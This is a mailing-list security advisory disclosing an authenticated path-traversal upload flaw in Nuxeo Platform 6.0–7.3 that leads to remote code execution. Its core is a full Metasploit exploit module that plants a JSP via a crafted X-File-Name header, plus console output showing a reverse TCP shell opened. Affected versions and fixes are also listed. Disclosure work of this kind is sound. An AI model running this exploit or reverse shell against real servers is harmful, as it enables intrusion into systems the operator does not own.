  oss-security - Nuxeo Platform remote code execution            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Thu, 23 Mar From: Sydream Labs <labs@...dream.com> To: fulldisclosure@...lists.org, oss-security@...ts.openwall.com Cc: cve@...re.org Subject: Nuxeo Platform remote code execution  # Description  Nuxeo Platform is a content management system for enterprises (CMS). It embeds an Apache Tomcat server, and can be managed through a web interface.  One of its features allows authenticated users to import files to the platform. By crafting the upload request with a specific ``X-File-Name`` header, one can successfuly upload a file at an arbitrary location of the server file system.  It is then possible to upload a JSP script to the root directory of the web application to execute commands on the remote host operating system. Setting the value ``../../nxserver/nuxeo.war/shell.jsp`` to the ``X-File-Name`` header is a way to do so.  ## Details  **CVE ID**:  **Access Vector**: network  **Security Risk**: high  **Vulnerability**:  **CVSS Base Score**: 8.8  **CVSS Vector**: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H  # Proof of Concept  Here is a metasploit module to exploit this vulnerability:  ```ruby ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class MetasploitModule < Msf::Exploit::Remote     Rank = ExcellentRanking      include Msf::Exploit::Remote::HttpClient      def initialize(info={})         super(update_info(info,             'Name'              => "Nuxeo Platform File Upload RCE",             'Description'       => %q{                 The Nuxeo Platform tool is vulnerable to an authenticated remote code execution,                 thanks to an upload module.             },             'License'           => MSF_LICENSE,             'Author'            => ['Ronan Kervella <r.kervella@...dream.com>'],             'References'        =>                 [                     ['https://nuxeo.com/', '']                 ],             'Platform'          => %w{linux},             'Targets'           => [ ['Nuxeo Platform 6.0 to 7.3', 'Platform' => 'linux'] ],             'Arch'              => ARCH_JAVA,             'Privileged'        => true,             'Payload'           => {},             'DisclosureDate'    => "",             'DefaultTarget'     => 0))         register_options(             [                 OptString.new('TARGETURI', [true, 'The path to the nuxeo application', '/nuxeo']),                 OptString.new('USERNAME', [true, 'A valid username', '']),                 OptString.new('PASSWORD', [true, 'Password linked to the username', ''])             ], self.class)     end      def jsp_filename         @jsp_filename ||= Rex::Text::rand_text_alpha(8) + '.jsp'     end      def jsp_path         'nxserver/nuxeo.war/' + jsp_filename     end      def nuxeo_login         res = send_request_cgi(             'method' => 'GET',             'uri'    => normalize_uri(target_uri.path, '/login.jsp')         )          fail_with(Failure::Unreachable, 'No response received from the target.') unless res         session_cookie = res.get_cookies          res = send_request_cgi(             'method'    => 'POST',             'uri'       => normalize_uri(target_uri.path, '/nxstartup.faces'),             'cookie'    => session_cookie,             'vars_post' => {                 'user_name'     => datastore['USERNAME'],                 'user_password' => datastore['PASSWORD'],                 'submit'        => 'Connexion'             }         )         return session_cookie if res && res.code == && res.redirection.to_s.include?('view_home.faces')         nil     end      def trigger_shell         res = send_request_cgi(             'method'    => 'GET',             'uri'       => normalize_uri(target_uri.path, jsp_filename)         )         fail_with(Failure::Unknown, 'Unable to get #{full_uri}/#{jsp_filename}') unless res && res.code ==     end      def exploit         print_status("Authenticating using #{datastore['USERNAME']}:#{datastore['PASSWORD']}")         session_cookie = nuxeo_login         if session_cookie             payload_url = normalize_uri(target_uri.path, jsp_filename)             res = send_request_cgi(                 'method'    => 'POST',                 'uri'       => normalize_uri(target_uri.path, '/site/automation/batch/upload'),                 'cookie'    => session_cookie,                 'headers'    => {                     'X-File-Name'   => '../../' + jsp_path,                     'X-Batch-Id'    => '00',                     'X-File-Size'   =>                     'X-File-Type'   => '',                     'X-File-Idx'    => '0',                     'X-Requested-With'  => 'XMLHttpRequest'                 },                 'ctype'             => '',                 'data' => payload.encoded             )             fail_with(Failure::Unknown, 'Unable to upload the payload') unless res && res.code ==             print_status("Executing the payload at #{normalize_uri(target_uri.path, payload_url)}.")             trigger_shell         else             fail_with(Failure::Unknown, 'Unable to login')         end     end  end ```  Module output:  ```bash msf> use exploit/multi/http/nuxeo msf exploit(nuxeo) > set USERNAME user1 USERNAME => user1 msf exploit(nuxeo) > set PASSWORD password PASSWORD => password msf exploit(nuxeo) > set rhost rhost => msf exploit(nuxeo) > set payload java/jsp_shell_reverse_tcp payload => java/jsp_shell_reverse_tcp msf exploit(nuxeo) > set lhost lhost => msf exploit(nuxeo) > exploit  [-] Handler failed to bind to  - [*] Started reverse TCP handler on [*] Authenticating using user1:password [*] Executing the payload at /nuxeo/nuxeo/QBCefwxQ.jsp. [*] Command shell session 1 opened -> at  id pwd /var/lib/nuxeo/server ```  # Vulnerable code  The vulnerable code is located in the `org.nuxeo.ecm.restapi.server.jaxrs.BatchUploadObject` class ([github where the header ``X-File-Name`` is not checked.  # Fix  Nuxeo provided a for this issue. A hotfix release is also available for Nuxeo 6.0 (Nuxeo 6.0 HF35).  Please note that vulnerability does not affect Nuxeo versions above 7.3.  # Affected versions  * Nuxeo 6.0 (LTS released * Nuxeo 7.1 (Fast Track, obsoleted by Nuxeo released * Nuxeo 7.2 (Fast Track, obsoleted by Nuxeo released * Nuxeo 7.3 (Fast Track, obsoleted by Nuxeo released  # Unaffected versions  * Nuxeo 6.0 HF35, released * Nuxeo 7.4 (Fast Track, obsoleted by Nuxeo released * Nuxeo (LTS released * Nuxeo (LTS released  # Credits  Ronan Kervella <r.kervella@...dream.com>  --  SYSDREAM Labs <labs@...dream.com>  GPG : C43E 2A2E 8EB4 8CD9 D5B2  * Website: https://sysdream.com/ * Twitter: @sysdream    Download attachment "signature.asc" of type "application/pgp-signature" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      